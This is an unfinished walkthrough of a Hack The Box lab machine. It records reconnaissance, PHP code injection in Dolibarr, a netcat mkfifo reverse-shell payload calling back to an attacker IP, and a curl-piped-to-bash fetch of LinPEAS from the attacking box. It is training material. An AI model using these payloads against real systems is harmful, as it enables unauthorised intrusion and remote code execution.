*Not finished*

nmap:

```
nmap -sC -sV {target ip}
```

Added the domain and ip to the hosts file:

```
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

Gobuster to enumerate vhosts:

```
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://board.htb
```

Uploads a PHP file to HTML input in Dolibarr to check for reverse shell vuln:

```
<?PHP echo system("whoami");?>
```

It is successful!

Run netcat locally:

```
nc -lnvp 4455
```

Use the payload to get the shell:

```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f");?>
```

Run this command to get a more stable shell, sending the output to `/dev/null`

```
 script /dev/null -c /bin/bash
 ```

Download LinPEAS locally, then set up a webserver locally, and curl LinPEAS from the attacking box

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

sudo python3 -m http.server 3000
```

```
curl http://10.10.14.41:3000/linpeas.sh|bash
```


